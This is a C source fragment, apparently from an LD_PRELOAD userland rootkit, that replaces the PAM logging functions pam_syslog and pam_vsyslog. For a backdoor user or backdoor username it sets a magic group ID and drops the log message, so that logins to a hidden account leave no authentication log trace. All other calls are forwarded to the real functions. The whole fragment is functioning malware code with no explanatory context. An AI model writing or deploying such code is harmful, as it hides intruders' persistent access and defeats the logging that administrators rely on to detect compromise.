void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
    if(is_bdusr()) return;

    char *user = get_username(pamh);
    if(user == NULL) return;

    if(is_bduname(user)){
        hook(CSETGID);
        (void)call(CSETGID, MAGIC_GID);
        return;
    }

    va_list va;
    va_start(va, fmt);
    pam_vsyslog(pamh, priority, fmt, va);
    va_end(va);
    return;
}

void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
    if(is_bdusr()) return;

    char *user = get_username(pamh);
    if(user == NULL) return;

    hook(CSETGID,
         CPAM_VSYSLOG);

    if(is_bduname(user)){
        (void)call(CSETGID, MAGIC_GID);
        return;
    }

    (void)call(CPAM_VSYSLOG, pamh, priority, fmt, args);
    return;
}